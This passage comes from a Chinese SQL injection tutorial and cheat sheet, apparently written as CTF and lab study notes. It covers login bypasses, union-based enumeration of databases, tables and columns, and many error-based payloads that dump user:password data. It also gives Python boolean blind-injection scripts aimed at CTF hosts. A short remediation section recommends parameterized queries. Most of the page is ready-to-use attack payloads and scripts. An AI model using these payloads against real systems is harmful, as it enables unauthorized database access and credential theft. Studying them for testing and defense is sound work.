src="https://cdn.nlark.com/yuque/0/2024/png/1348197/1732455937693-5573bf0a-b288-4df2-8517-8b3a3aaba579.png?x-oss-process=image/format,webp/resize,w_1237,limit_0" alt="image.png"></p><p>正常的万能密码传入’or’1’&#x3D;’1 时语句如下，or是或，其中一个条件满足即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from user1 where username=&#x27;&#x27;or&#x27;1&#x27;=&#x27;1&#x27;    and password=&#x27;&#x27;or&#x27;1&#x27;=&#x27;1&#x27;</span><br></pre></td></tr></table></figure><h3 id="二、账号存在注入"><a href="#二、账号存在注入" class="headerlink" title="二、账号存在注入"></a>二、账号存在注入</h3><p>后端语句,是根据用户名查询出密码，然后跟我们输入的密码进行比对</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from user1 where username=&#x27;用户名&#x27;</span><br></pre></td></tr></table></figure><p>用户名单引号结果如下</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/1348197/1732457477805-e4d8f4ce-548e-455b-a290-2edcf211072f.png?x-oss-process=image/format,webp/resize,w_1237,limit_0" alt="image.png"></p><p>知道列数的情况下可以利用联合注入来把返回的内容替换</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/1348197/1732457660004-bc028995-adb3-4511-8948-16cee62acc8a.png?x-oss-process=image/format,webp" alt="image.png"></p><p>后端是md5加密那么，我们把密码部分替换成加密后的md5</p><p>此时查询出来的密码为md5了</p><p>1行(0.001秒)编辑,EXPLAIN,导出</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/1348197/1732457832776-5e84a5be-968f-41e4-8470-5c6612f3645e.png?x-oss-process=image/format,webp" alt="image.png"></p><p>利用这个方法，我们传参为a，后端加密成 0cc175b9c0f1b6a831c399e269772661 </p><p>此时数据库查询返回的密码为0cc175b9c0f1b6a831c399e269772661 我们传入的密码为a经过md5加密后也等于上面这个值所以登陆成功</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/1348197/1732458881438-a4c500bf-8902-404f-87de-68500a9dd5dd.png?x-oss-process=image/format,webp/resize,w_1237,limit_0" alt="image.png"></p><p> 3.账号存在注入限制长度 </p><p>后端语句,是根据用户名查询出密码，然后跟我们输入的密码进行比对,跟上一题一样唯一多的就是多了长度限制</p><p>用上一题payload显示长度过长</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/1348197/1732459006414-1a8bfb5b-0b86-4ae7-a621-94de10e7d068.png?x-oss-process=image/format,webp/resize,w_1237,limit_0" alt="image.png"></p><p>mysql内部有md5等加密函数能够实现</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/1348197/1732459237354-67f0c908-c358-434e-98bd-42875f58a640.png?x-oss-process=image/format,webp" alt="image.png"></p><p>成功登录，绕过长度限制</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/1348197/1732459220307-84ca7676-b1e8-43d4-b9da-cda10380e8e9.png?x-oss-process=image/format,webp/resize,w_1237,limit_0" alt="image.png"></p><p> 4.账号存在单引号过滤，可利用\转义 </p><p>后端语句如下</p><p>select * from user1 where username&#x3D;’用户名’  and password&#x3D;’密码’</p><p>输入单引号会被后端替换成&#39;,输入的单引号会被当成 “数据” </p><p>select * from user1 where username&#x3D;’abc&#39;‘  and password&#x3D;’1312312’</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/1348197/1732459565888-63b01666-116e-4a28-be4f-063d6b51962f.png?x-oss-process=image/format,webp" alt="image.png"></p><p>但是 账号跟密码都输入\的时候会把原来的单引号给转义 比如账号输入 abc\ 密码输入cba,很明显可以看到cba这部分是可以执行的部分而并非 “数据”</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/1348197/1732459747355-01320d70-608e-4ae3-b2a8-9bf156230ff2.png?x-oss-process=image/format,webp" alt="image.png"></p><p>那么输入即可登陆成功</p><p>username&#x3D;&amp;password&#x3D;or+1&#x3D;1–+\</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/1348197/1732459842491-1437f700-94a9-44ef-9661-3a476d2c8ccd.png?x-oss-process=image/format,webp" alt="image.png"></p><p>后端语句此时如下</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/1348197/1732459898806-500edc6f-ffb4-40ec-b90b-8fb17c51b138.png?x-oss-process=image/format,webp" alt="image.png"></p><h3 id="三、其他"><a href="#三、其他" class="headerlink" title="三、其他"></a>三、其他</h3><p> 3.1为什么payload注释后面会多奇奇怪怪的随机字符 </p><p>经常能碰到payload如下这种情况注释后面跟着其他字符</p><p>mysql的注释–后面必须要跟着空白字符才生效</p><p>select * from user1 where username&#x3D;’A’ – 这是注释内容</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/1348197/1732456450137-fb168d92-9ace-478e-8d23-72fa7b842f72.png?x-oss-process=image/format,webp" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/1348197/1732456496013-4ed4a1dc-9e38-4103-919b-1f360744124b.png?x-oss-process=image/format,webp" alt="image.png"></p><p> 在开发中一般会去除接受到的参数的前后空白字符比如php的trim函数</p><p>PHPTRIM()函数从字符串的两端删除空白字符和其他预定义字符.</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/1348197/1732456705212-49669520-ee95-4bd4-a0ba-7ac77ba1ebec.png?x-oss-process=image/format,webp" alt="image.png"></p><p>所以在注释后面加上其他字符可以防止–+里面的+被去除也不影响注释</p><p> 3.2快速判断数据库 </p><p>当在用两个单引号判断注入的时候,两个单引号之间可以放内容</p><p>例如url如下</p><p><a href="http://192.168.0.217/?id=1">http://192.168.0.217/?id=1</a>‘’</p><p>后端语句如下</p><p>select * from sqli_data where id&#x3D;’1’’’ order by id limit 1</p><p>在两个单引号之间输入%0b不会报错</p><p><a href="http://192.168.0.217/?id=1%27%0B">http://192.168.0.217/?id=1&#39;%0B</a>‘ </p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/1348197/1732457116646-9a84ae6c-16f9-496b-81b8-048ef429e4c9.png?x-oss-process=image/format,webp" alt="image.png"></p><p>通过不同数据库支持的字符不同即可得到数据库类型</p><p>mysql 支持 %0A %0b 等</p><p>Oracle 支持 %0A %00等</p><p>mssql 支持 %1F….等</p><p>利用&#x2F;**&#x2F;发现正常</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/1348197/1732457209062-017f0645-7452-4978-8919-89b9ac19ab24.png?x-oss-process=image/format,webp" alt="image.png"></p><p>加上感叹号在加点内容后报错，判断为mysql,因为mysql支持内联注入</p><p>&#x2F;<em>!AAA</em>&#x2F;</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/1348197/1732457258688-0d2d750f-baca-4bb8-beef-7e2614fd5d97.png?x-oss-process=image/format,webp" alt="image.png"></p><p> 3.3 mysql注释字符 </p><p>–空白字符 %09 %0b</p><p>#</p><p>‘;%00</p><p>sql注入的常见情况是</p><p>单引号和双引号引起状态码和报错信息的出现，比如200的页面，输入一个单引号变成500，两个则重新变成200</p><h2 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h2><p>黑客是可以根据所能控制的内容在SQL语句的上下文导致不同的结果的，这种不同主要体现在不同的<code>数据库特性上和细节上</code>，因为很多的数据库在标准的SQL之外也会实现一些自身比较特别的功能和扩展，<code>常见的有Sqlserver的多语句查询，Mysql的高权限可以读写系统文件，Oracle经常出现的一些系统包提权漏洞。</code></p><h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>比较传统的修复方式一般认为是对输入的数据进行有效的过滤，但是由于输入的来源太过广泛，可能来自于数据库，HTTP请求，文件或者其他的数据来源，较难对所有进入的数据在各种场景下进行有效的过滤。 事实上最罪恶的不是数据，而是我们使用数据的方式，最为彻底的修复一定要查找最为彻底的根源，我们可以看到最后的根源在于对数据和指令的不分离，所以在修复的时候应该极力将数据和指令分离。目前较为提倡的，同时在各种数据库操作框架里体现的方式就是以填充模板的方式来代替传统的拼接的方式进行数据库查询，譬如：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$SqlTemplate</span>=<span class="string">&quot;select * from members where userid=&#123;userid|int&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sb</span>-&gt;<span class="title function_ invoke__">PreSql</span>(<span class="variable">$SqlTemplate</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;userid&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>模板里有关数据及数据自身意义的描述，PreSql方法将实现将模板和数据安全的转换为SQL语句的功能，以保障最终的安全的实现</p><h1 id="姿势总结"><a href="#姿势总结" class="headerlink" title="姿势总结"></a>姿势总结</h1><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p>我们篡改SQL语句很多时候都会使用到注释，SQL语法中的注释符有以下几种：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#</span><br><span class="line">--+(这里的+其实是空格的意思，因为我们的注入时+通常会被识别为空格，这是早期养成的习惯，但是后来在看一些大牛的文章的时候会发现他们更爱用-- -这种形式，很多工具等等也是)</span><br><span class="line">/**/(这个也不太常用)</span><br></pre></td></tr></table></figure><h1 id="mysql注入"><a href="#mysql注入" class="headerlink" title="mysql注入"></a>mysql注入</h1><h2 id="mysql数据库"><a href="#mysql数据库" class="headerlink" title="mysql数据库"></a>mysql数据库</h2><p>MySQL是一个关系型数据库管理系统，由瑞典 MySQL AB 公司开发，目前属于 Oracle 公司。MySQL 是一种 <code>关联数据库管理系统</code> ，关联数据库将数据保存在不同的表中，而不是将所有数据放在一个大仓库内，这样就增加了速度并提高了灵活性。</p><p>一个完整的mysql管理系统结构通常如下图：</p><p><img src="https://raw.githubusercontent.com/chencicici/images/main/202206241358298.png" alt="img"></p><p>可以看到，mysql可以管理 <code>多个数据库</code> ，一个数据库可以包含 <code>多个数据表</code>，而一个数据表有含有 <code>多条字段</code> ，一行数据正是多个字段同一行的一串数据。</p><h2 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h2><p>很多时候联合查询也会和其他的几种查询方式一起使用。<br>联合查询用到的SQL语法知识</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UNION可以将前后两个查询语句的结果拼接到一起，但是会自动去重。</span><br><span class="line">UNION ALL功能相同，但是会显示所有数据，不会去重。</span><br></pre></td></tr></table></figure><p>具有类似功能的还有JOIN <a href="https://blog.csdn.net/julielele/article/details/82023577">https://blog.csdn.net/julielele/article/details/82023577</a> 但是是一个对库表等进行连接的语句，我们在后续的绕过中会提到利用它来进行无列名注入。</p><ol><li><p>判断是否存在注入，注入是字符型还是数字型，闭合情况，绕过方式</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; </span><br><span class="line">?id=1&quot; </span><br><span class="line">?id=1&#x27;) </span><br><span class="line">?id=1&quot;) </span><br><span class="line">?id=1&#x27; or 1#</span><br><span class="line">?id=1&#x27; or 0#</span><br><span class="line">?id=1&#x27; or 1=1#</span><br><span class="line">?id=1&#x27; and 1=2#</span><br><span class="line">?id=1&#x27; and sleep(5)#</span><br><span class="line">?id=1&#x27; and 1=2 or &#x27; </span><br><span class="line">?id=1\</span><br></pre></td></tr></table></figure></li><li><p>猜测SQL查询语句中的字段数</p></li></ol><ul><li><p>使用 order&#x2F;group by 语句，通过往后边拼接数字指导页面报错，可确定字段数量。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; order by 1#</span><br><span class="line">1&#x27; order by 2#</span><br><span class="line">1&#x27; order by 3#</span><br><span class="line">1 order by 1</span><br><span class="line">1 order by 2</span><br><span class="line">1 order by 3</span><br><span class="line">​```   </span><br><span class="line"></span><br><span class="line">- 使用 union select 联合查询，不断在 union select 后面加数字，直到不报错，即可确定字段数量。</span><br><span class="line">​```bash</span><br><span class="line">1&#x27; union select 1#</span><br><span class="line">1&#x27; union select 1,2#</span><br><span class="line">1&#x27; union select 1,2,3#</span><br><span class="line">1 union select 1#</span><br><span class="line">1 union select 1,2#</span><br><span class="line">1 union select 1,2,3#</span><br></pre></td></tr></table></figure></li></ul><ol><li><p>确定显示数据的字段位置</p><p>使用 union select 1,2,3,4,… 根据回显的字段数，判断回显数据的字段位置。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1#</span><br><span class="line">-1&#x27; union select 1,2#</span><br><span class="line">-1&#x27; union select 1,2,3#</span><br><span class="line">-1 union select 1#</span><br><span class="line">-1 union select 1,2#</span><br><span class="line">-1 union select 1,2,3#</span><br></pre></td></tr></table></figure></li></ol><p>注意：</p><ul><li>若确定页面有回显，但是页面中并没有我们定义的特殊标记数字出现，可能是页面进行的是单行数据输出，我们让前边的 select 查询条件返回结果为空即可。</li><li>⼀定要拼接够足够的字段数，否则SQL语句报错。</li></ul><ol><li>在回显数据的字段位置使用 union select 将我们所需要的数据查询出来即可。包括但不限于：</li></ol><ul><li><p>获取当前数据库名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,2,database()--+</span><br></pre></td></tr></table></figure></li><li><p>获取当前数据库的表名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+</span><br><span class="line"></span><br><span class="line">-1&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3--+</span><br></pre></td></tr></table></figure></li><li><p>获取表中的字段名</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br><span class="line"></span><br><span class="line">-1&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),3--+</span><br></pre></td></tr></table></figure></li><li><p>获取数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,2,group_concat(id,0x7c,username,0x7c,password) from users--+</span><br><span class="line"></span><br><span class="line">-1&#x27; union select 1,(select group_concat(id,0x7c,username,0x7c,password) from users),3--+</span><br></pre></td></tr></table></figure><p>一般情况下就是这样的一个顺序，<code>确定联合查询的字段数-&gt;确定联合查询回显位置-&gt;爆库-&gt;爆表-&gt;爆字段-&gt;爆数据。</code></p></li></ul><p>我们可以看到这里使用了group_concat来拼接查询多个数据，在很多种查询中都有使用这个函数来提高效率，同时还可以拼接十六进制特殊字符来分隔，同时还使用了information_shcema表获取表信息、字段信息，这个表在低版本mysql中不存在，同时有时还会被过滤，这也会是我们绕过的一个方向。</p><p>在Mysql5.0以上的版本中加入了一个information_schema这个系统表，这个系统表中包含了该数据库的所有数据库名、表名、列表，可以通过<a href="https://so.csdn.net/so/search?q=SQL%E6%B3%A8%E5%85%A5&spm=1001.2101.3001.7020">SQL注入</a>来拿到用户的账号和口令，而Mysql5.0以下的只能暴力跑表名；5.0 以下是多用户单操作，5.0 以上是多用户多操作。</p><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>大体的思路就是利用报错回显，同时我们的查询指令或者SQL函数会被执行，<code>报错的过程可能会出现在查询或者插入甚至删除的过程中。</code></p><h3 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h3><p>floor()（8.x&gt;mysql&gt;5.0）<code>双查询报错注入</code><br>函数返回小于或等于指定值（value）的最小整数,取整</p><p>通过floor报错的方法来爆数据的本质是group by语句的报错。group by语句报错的原因是floor(random(0)*2)的不确定性，即可能为0也可能为1<br>group by key的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中更新临时表中的数据；如果该key不存在于临时表中，则在临时表中插入key所在行的数据。<br>group by floor(random(0)*2)出错的原因是key是个随机数，检测临时表中key是否存在时计算了一下floor(random(0)*2)可能为0，如果此时临时表只有key为1的行不存在key为0的行，那么数据库要将该条记录插入临时表，由于是随机数，插时又要计算一下随机值，此时floor(random(0)*2)结果可能为1，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=0’ union select 1,2,3 from(select count(*),concat((select concat(version(),’-’,database(),’-’,user()) limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a --+</span><br><span class="line">/*拆解出来就是下面的语句*/</span><br><span class="line">concat((select concat(version(),’-’,database(),’-’,user()) limit 0,1),floor(rand(0)*2))x</span><br></pre></td></tr></table></figure><p>可以看到这里实际上不光使用了报错注入还是用了刚刚的联合查询，同时还是一个双查询的报错注入，当在一个聚合函数，比如count()函数后面如果使用group by分组语句的话，就可能会把查询的一部分以错误的形式显示出来。但是要多次测试才可以得到报错</p><p>双查询报错注入的原理 <a href="https://blog.csdn.net/lixiangminghate/article/details/80466257%EF%BC%8Chttps://www.freebuf.com/articles/web/250376.html">https://blog.csdn.net/lixiangminghate/article/details/80466257，https://www.freebuf.com/articles/web/250376.html</a></p><p>大体思路就是当在一个聚合函数，比如count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来，但是因为随机数要测试多次才能得到报错，上面报错注入函数中的第一个Floor()就是这种情况。</p><h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h3><p>对XML文档进行查询的函数</p><p>第二个参数 xml中的位置是可操作的地方，xml文档中查找字符位置是用 &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;…这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and (extractvalue(‘anything’,concat(‘#’,substring(hex((select database())),1,5))))</span><br></pre></td></tr></table></figure><h3 id="UPDATEXML-XML-document-XPath-string-new-value"><a href="#UPDATEXML-XML-document-XPath-string-new-value" class="headerlink" title="UPDATEXML (XML_document, XPath_string, new_value);"></a>UPDATEXML (XML_document, XPath_string, new_value);</h3><p>第一个参数：XML_document是String格式，为XML文档对象的名称 文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>作用：改变文档中符合条件的节点的值</p><p>由于updatexml的第二个参数需要Xpath格式的字符串，如果不符合xml格式的语法，就可以实现报错注入了。</p><p>这也是一种非常常见的报错注入的函数。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; and updatexml(1,concat(0x7e,(select user()),0x7e),1)--+</span><br></pre></td></tr></table></figure><h3 id="exp-x"><a href="#exp-x" class="headerlink" title="exp(x)"></a>exp(x)</h3><p>返回 e 的 x 次方,当 数据过大 溢出时报错，即 x &gt; 709</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mail=&#x27;) or exp(~(select * from (select (concat(0x7e,(SELECT GROUP_CONCAT(user,&#x27;:&#x27;,password) from manage),0x7e))) as asd))--+</span><br></pre></td></tr></table></figure><h3 id="geometrycollection-mysql-版本5-5"><a href="#geometrycollection-mysql-版本5-5" class="headerlink" title="geometrycollection() mysql 版本5.5"></a>geometrycollection() mysql 版本5.5</h3><p>（1）函数解释：<br>GeometryCollection是由1个或多个任意类几何对象构成的几何对象。GeometryCollection中的所有元素必须具有相同的空间参考系（即相同的坐标系）。</p><p>（2）官方文档中举例的用法如下：<br>GEOMETRYCOLLECTION(POINT(10 10), POINT(30 30), LINESTRING(15 15, 20 20))</p><p>（3）报错原因：<br>因为MYSQL无法使用这样的字符串画出图形，所以报错</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;) and geometrycollection((select * from(select * from(select column_name from information_schema.columns where table_name=&#x27;manage&#x27; limit 0,1)a)b)); %23</span><br><span class="line">1&#x27;) and geometrycollection((select * from(select * from(select distinct concat(0x23,user,0x2a,password,0x23,name,0x23) FROM manage limit 0,1)a)b)); %23</span><br><span class="line">1&#x27;) and geometrycollection((select * from(select * from(select version())a)b)); %23</span><br></pre></td></tr></table></figure><p>这里和我们上面学过的cancat和上一关学的内置表有两个梦幻联动</p><h3 id="multipoint-mysql-版本5-5"><a href="#multipoint-mysql-版本5-5" class="headerlink" title="multipoint() mysql 版本5.5"></a>multipoint() mysql 版本5.5</h3><p>（1）函数解释：<br>MultiPoint是一种由Point元素构成的几何对象集合。这些点未以任何方式连接或排序。<br> <br>（2）报错原因：<br>同样是因为无法使用字符串画出图形与geometrycollection类似</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;) and multipoint((select * from(select * from(select version())a)b)); %23</span><br></pre></td></tr></table></figure><h3 id="polygon"><a href="#polygon" class="headerlink" title="polygon()"></a>polygon()</h3><p>polygon来自希腊。 “Poly” 意味 “many” ， “gon” 意味 “angle”.<br>Polygon是代表多边几何对象的平面Surface。它由单个外部边界以及0或多个内部边界定义，其中，每个内部边界定义为Polygon中的1个孔。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;) or polygon((select * from(select * from(select (SELECT GROUP_CONCAT(user,&#x27;:&#x27;,password) from manage))asd)asd))--+</span><br></pre></td></tr></table></figure><h3 id="mutipolygon"><a href="#mutipolygon" class="headerlink" title="mutipolygon()"></a>mutipolygon()</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;) or multipolygon((select * from(select * from(select (SELECT GROUP_CONCAT(user,&#x27;:&#x27;,password) from manage))asd)asd))</span><br></pre></td></tr></table></figure><h3 id="linestring-）"><a href="#linestring-）" class="headerlink" title="linestring(）"></a>linestring(）</h3><p>报错原理：<br>mysql的有些几何函数（ 例如geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring() ）对参数要求为几何数据，若不满足要求则会报错，适用于5.1-5.5版本 (5.0.中存在但是不会报错)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;) and linestring((select * from(select * from(select database())a)b))--+;</span><br></pre></td></tr></table></figure><h3 id="multilinestring"><a href="#multilinestring" class="headerlink" title="multilinestring()"></a>multilinestring()</h3><p>同上</p><h3 id="ST-LatFromGeoHash-（mysql-5-7-x）"><a href="#ST-LatFromGeoHash-（mysql-5-7-x）" class="headerlink" title="ST.LatFromGeoHash()（mysql&gt;&#x3D;5.7.x）"></a>ST.LatFromGeoHash()（mysql&gt;&#x3D;5.7.x）</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;) or ST_LatFromGeoHash((select * from(select * from(select (select (concat(0x7e,(SELECT GROUP_CONCAT(user,&#x27;:&#x27;,password) from manage),0x7e))))a)b))--+</span><br></pre></td></tr></table></figure><h3 id="ST-LongFromGeoHash"><a href="#ST-LongFromGeoHash" class="headerlink" title="ST.LongFromGeoHash"></a>ST.LongFromGeoHash</h3><p>同上 嵌套查询</p><h3 id="ST-Pointfromgeohash-mysql-5-7"><a href="#ST-Pointfromgeohash-mysql-5-7" class="headerlink" title="ST_Pointfromgeohash (mysql&gt;5.7)"></a>ST_Pointfromgeohash (mysql&gt;5.7)</h3><p>获取数据库版本信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;)or  ST_PointFromGeoHash(version(),1)--+</span><br><span class="line">&#x27;)or  ST_PointFromGeoHash((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)--+</span><br><span class="line">&#x27;)or  ST_PointFromGeoHash((select column_name from information_schema.columns where table_name = &#x27;manage&#x27; limit 0,1),1)--+</span><br><span class="line">&#x27;)or  ST_PointFromGeoHash((concat(0x23,(select group_concat(user,&#x27;:&#x27;,`password`) from manage</span><br></pre></td></tr></table></figure><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>SQL Injection（Blind），即SQL盲注，与一般注入的区别在于，一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取sql语句的执行结果，甚至连注入语句是否执行都无从得知，因此盲注的难度要比一般注入高。目前网络上现存的SQL注入漏洞大多是SQL盲注。</p><p>对于基于布尔的盲注，可通过构造真or假判断条件（数据库各项信息取值的大小比较， 如：字段长度、版本数值、字段名、字段名各组成部分在不同位置对应的字符ASCII码…）， 将构造的sql语句提交到服务器，然后根据服务器对不同的请求返回不同的页面结果 （True、False）；然后不断调整判断条件中的数值以逼近真实值，特别是需要关注响应从True&lt;–&gt;False发生变化的转折点。</p><h3 id="用到的SQL语法知识"><a href="#用到的SQL语法知识" class="headerlink" title="用到的SQL语法知识"></a>用到的SQL语法知识</h3><p>会用到截取字符的函数：substr()<br>可以直接判断字符或者根据ASCII码来判断，利用ASCII码时要用到ASCII()函数来将字符转换为ASCII码值。<br>还用到了各种运算符，&lt;，&gt;，&#x3D;当然不必多提，但是在下面POST的方式中用到了异或符号^，这里其实是一种异或注入的方法，当我们在尝试SQL注入时,发现union,and被完全过滤掉了,就可以考虑使用异或注入。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">异或运算规则:</span><br><span class="line">1^1=0 0^0=0 0^1=1</span><br><span class="line">1^1^1=0 1^1^0=0</span><br><span class="line">构造payload:&#x27;^ascii(mid(database(),1,1)=98)^0</span><br></pre></td></tr></table></figure><p>注意这里会多加一个^0或1是因为在盲注的时候可能出现了语法错误也无法判断,而改变这里的0或1,如果返回的结果是不同的,那就可以证明语法是没有问题的.</p><h3 id="注入流程"><a href="#注入流程" class="headerlink" title="注入流程"></a>注入流程</h3><p>首先通过页面对于永真条件or 1&#x3D;1 与永假条件 and 1&#x3D;2 的返回内容是否存在差异进行判断是否可以进行布尔盲注。</p><p>下面给出常用的布尔盲注脚本。</p><ul><li><p>GET型注入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">url = &#x27;http://474d31bb-1f69-4636-9798-319f27a7fb08.node3.buuoj.cn/&#x27;</span><br><span class="line"></span><br><span class="line">cookies = &#123;       # 如果目标网站要事先登录，就加上cookies吧</span><br><span class="line">    &quot;PHPSESSID&quot;:&quot;c8ab8r49nd2kk0qfhs0dcaktl3&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for i in range(1,90000):</span><br><span class="line">   low = 32</span><br><span class="line">   high = 128</span><br><span class="line">   mid = (low+high)//2</span><br><span class="line">   while(low&lt;high):</span><br><span class="line">       payload = &quot;http://474d31bb-1f69-4636-9798-319f27a7fb08.node3.buuoj.cn/Less-8/?id=0&#x27; or ascii(substr(database(),%d,1))&gt;%d-- &quot; %(i,mid)    # 注意get型的注入注释符要用--空格</span><br><span class="line">       res = requests.get(url=payload)</span><br><span class="line"></span><br><span class="line">       if &#x27;You are in&#x27; in res.text:      # 为真时，即判断正确的时候的条件</span><br><span class="line">           low = mid+1</span><br><span class="line">       else:</span><br><span class="line">           high = mid</span><br><span class="line">       mid = (low+high)//2</span><br><span class="line">   if(mid ==32 or mid ==127):</span><br><span class="line">       break</span><br><span class="line">   flag = flag+chr(mid)</span><br><span class="line">   print(flag)</span><br></pre></td></tr></table></figure></li><li><p>POST型注入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &#x27;http://81689af7-4cd5-432c-a88e-f5113e16c7c1.node3.buuoj.cn/index.php&#x27;</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for i in range(1,250):</span><br><span class="line">   low = 32</span><br><span class="line">   high = 128</span><br><span class="line">   mid = (low+high)//2</span><br><span class="line">   while(low&lt;high):</span><br><span class="line">       #payload = &#x27;http://d63d924a-88e3-4036-b463-9fc6a00f4fef.node3.buuoj.cn/search.php?id=1^(ascii(substr(database(),%d,1))=%d)#&#x27; %(i,mid)</span><br><span class="line">       payload = &quot;0^(ascii(substr((select(flag)from(flag)),%d,1))&gt;%d)#&quot; %(i,mid)</span><br><span class="line">       datas = &#123;</span><br><span class="line">                     &quot;id&quot;:payload</span><br><span class="line">                &#125;</span><br><span class="line">       res = requests.post(url=url,data=datas)</span><br><span class="line"></span><br><span class="line">       if &#x27;girlfriend&#x27; in res.text:      # 为真时，即判断正确的时候的条件</span><br><span class="line">           low = mid+1</span><br><span class="line">       else:</span><br><span class="line">           high = mid</span><br><span class="line">       mid = (low+high)//2</span><br><span class="line">   if(mid ==32 or mid ==127):</span><br><span class="line">       break</span><br><span class="line">   flag = flag+chr(mid)</span><br><span class="line">   print(flag)</span><br></pre></td></tr></table></figure></li></ul><p>首先，我们先分析脚本的思路，脚本利用了request库来发送请求，同时定义了一个flag字符串用来储存flag。然后写了一个for循环，封顶跑250遍，然后定义了low和high，这里根据的是ASCII码中的打印字符，定义了中间值，因为一会儿要使用的是二分法，当low&lt;high时进入while循环，执行payload是否大于mid的判断，这里GET和POST略有区别，GET传入的键值对，利用requests.post方法进行请求，GET直接把Payload拼接在url后面进行requests.get方法即可，然后根据我们判断真假的方式写一个if循环，这里的res.text是返回数据，可以先写个简单脚本看一下该怎么从其中判断真假，如果为真low&#x3D;mid+1，然后再取中间值，如果为假则high&#x3D;mid然后取中间值，直到low大于high就能确定出该位置的ASCII码了，然后最下面的if循环是排除掉在两端的特殊情况，然后每次循环打印一次flag，有时候可能还要设置延时，这里没有管。</p><p>利用异或的：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=0&#x27;^1--+</span><br><span class="line">?id=0&#x27;^0--+</span><br><span class="line">?id=0&#x27;^(ascii(substr(database(),1,1))&gt;1)--+</span><br><span class="line">?id=0&#x27;^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=database()),&#123;0&#125;,1))=&#123;1&#125;)--+</span><br></pre></td></tr></table></figure><p>利用order by的</p><figure 